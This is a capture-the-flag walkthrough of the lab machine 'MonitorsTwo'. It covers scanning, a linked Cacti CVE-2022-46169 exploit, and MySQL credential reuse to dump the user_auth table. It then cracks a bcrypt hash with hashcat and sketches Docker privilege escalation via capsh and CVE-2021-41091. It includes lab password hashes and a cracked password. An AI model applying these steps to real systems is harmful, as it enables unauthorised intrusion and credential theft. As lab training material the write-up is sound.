## 1. Reconnaissance
### Nmap
`sudo nmap -sS -sV -Pn 10.10.11.211`
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 11:31 EDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 75.00% done; ETC: 11:32 (0:00:00 remaining)
Nmap scan report for 10.10.11.211
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
```
### Web Service
- Version 1.2.22 | (c) 2004-2023 - The Cacti Group
## 2. Obtain webshell
- Vulnerability: [CVE-2022-46169](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
## 3. Get User Flag
- Find `user.txt` returns nothing
- Check environment, observe `docker`
```
www-data@50bca5e748b0:/var/www/html$ ls -la /
ls -la /
total 84
drwxr-xr-x   1 root root 4096 Mar 21 10:49 .
drwxr-xr-x   1 root root 4096 Mar 21 10:49 ..
-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 22 13:21 bin
drwxr-xr-x   2 root root 4096 Mar 22 13:21 boot
drwxr-xr-x   5 root root  340 Jun 14 15:58 dev
-rw-r--r--   1 root root  648 Jan  5 11:37 entrypoint.sh
drwxr-xr-x   1 root root 4096 Mar 21 10:49 etc
drwxr-xr-x   2 root root 4096 Mar 22 13:21 home
drwxr-xr-x   1 root root 4096 Nov 15  2022 lib
drwxr-xr-x   2 root root 4096 Mar 22 13:21 lib64
drwxr-xr-x   2 root root 4096 Mar 22 13:21 media
drwxr-xr-x   2 root root 4096 Mar 22 13:21 mnt
drwxr-xr-x   2 root root 4096 Mar 22 13:21 opt
dr-xr-xr-x 270 root root    0 Jun 14 15:58 proc
drwx------   1 root root 4096 Mar 21 10:50 root
drwxr-xr-x   1 root root 4096 Nov 15  2022 run
drwxr-xr-x   1 root root 4096 Jan  9 09:30 sbin
drwxr-xr-x   2 root root 4096 Mar 22 13:21 srv
dr-xr-xr-x  13 root root    0 Jun 14 15:58 sys
drwxrwxrwt   1 root root 4096 Jun 14 16:03 tmp
drwxr-xr-x   1 root root 4096 Nov 14  2022 usr
drwxr-xr-x   1 root root 4096 Nov 15  2022 var
```
- Check `entrypoint.sh` file
```
www-data@50bca5e748b0:/$ cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```
- Obtain `root:root` credentials for MySQL database. Enum the database
```
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "show tables;"
<--user=root --password=root cacti -e "show tables;"
Tables_in_cacti
aggregate_graph_templates
aggregate_graph_templates_graph
aggregate_graph_templates_item
aggregate_graphs
aggregate_graphs_graph_item
aggregate_graphs_items
automation_devices
automation_graph_rule_items
automation_graph_rules
automation_ips
automation_match_rule_items
automation_networks
automation_processes
automation_snmp
automation_snmp_items
automation_templates
automation_tree_rule_items
automation_tree_rules
cdef
cdef_items
color_template_items
color_templates
colors
data_debug
data_input
data_input_data
data_input_fields
data_local
data_source_profiles
data_source_profiles_cf
data_source_profiles_rra
data_source_purge_action
data_source_purge_temp
data_source_stats_daily
data_source_stats_hourly
data_source_stats_hourly_cache
data_source_stats_hourly_last
data_source_stats_monthly
data_source_stats_weekly
data_source_stats_yearly
data_template
data_template_data
data_template_rrd
external_links
graph_local
graph_template_input
graph_template_input_defs
graph_templates
graph_templates_gprint
graph_templates_graph
graph_templates_item
graph_tree
graph_tree_items
host
host_graph
host_snmp_cache
host_snmp_query
host_template
host_template_graph
host_template_snmp_query
plugin_config
plugin_db_changes
plugin_hooks
plugin_realms
poller
poller_command
poller_data_template_field_mappings
poller_item
poller_output
poller_output_boost
poller_output_boost_local_data_ids
poller_output_boost_processes
poller_output_realtime
poller_reindex
poller_resource_cache
poller_time
processes
reports
reports_items
sessions
settings
settings_tree
settings_user
settings_user_group
sites
snmp_query
snmp_query_graph
snmp_query_graph_rrd
snmp_query_graph_rrd_sv
snmp_query_graph_sv
snmpagent_cache
snmpagent_cache_notifications
snmpagent_cache_textual_conventions
snmpagent_managers
snmpagent_managers_notifications
snmpagent_mibs
snmpagent_notifications_log
user_auth
user_auth_cache
user_auth_group
user_auth_group_members
user_auth_group_perms
user_auth_group_realm
user_auth_perms
user_auth_realm
user_domains
user_domains_ldap
user_log
vdef
vdef_items
version
```
- Dump data from table `user_auth`
```
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth;"
<--password=root cacti -e "select * from user_auth;"
id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees    policy_hosts        policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts lastfail        reset_perms
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on      on      2       1       1       1       1       on      -1      -1 -1               0       0       663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1      -1              0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1       1       1       1       1       on      -1      -1 on       0       0       2135691668
```
- Obtain 2 user with hashed password. Try dump with hashcat
```
$hashcat -m 3200 users.hash /usr/share/wordlists/rockyou.txt  --show

$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```
## 4. Get Root Flag
- `linpeas.sh` reveal some mail files. Read the files
```
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```
- Check Docker version
```
Docker version 20.10.5+dfsg1, build 55c4c88
```
- Vulnerability: [CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091)
- It require root permission on Docker. Try to PE on docker.
- Run `linpeas.sh` on docker found `capsh`. Get PE payload from GTFOBins -> Get root permission on Docker -> Process CVE-2021-41091
